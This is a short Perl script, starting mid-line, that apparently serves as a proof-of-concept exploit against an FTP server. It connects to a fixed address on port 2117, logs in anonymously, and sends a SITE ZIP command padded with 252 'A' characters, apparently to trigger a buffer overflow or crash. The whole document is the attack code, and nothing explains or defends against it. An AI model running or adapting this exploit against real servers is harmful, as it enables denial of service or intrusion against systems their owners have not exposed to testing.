e IO::Socket;

$host = "192.168.1.243";

$remote = IO::Socket::INET->new ( Proto => "tcp", PeerAddr => $host, PeerPort => "2117");

unless ($remote) { die "cannot connect to ftp daemon on $host" }

print "connected\n";
while (<$remote>)
{
 print $_;
 if (/220 /)
 {
  last;
 }
}

$remote->autoflush(1);

my $ftp = "USER anonymous\r\n";

print $remote $ftp;
print $ftp;
sleep(1);

while (<$remote>)
{
 print $_;
 if (/331 /)
 {
  last;
 }
}

$ftp = join("", "PASS ", "a\@b.com", "\r\n");
print $remote $ftp;
print $ftp;
sleep(1);

while (<$remote>)
{
 print $_;
 if (/230 /)
 {
  last;
 }
}

$ftp = join ("", "SITE ZIP /d:", "A"x(252), "\r\n");

print $remote $ftp;
print $ftp;
sleep(1);

while (<$remote>)
{
 print $_;
 if (/250 Done/)
 {
  last;
 }
}

close $remote;
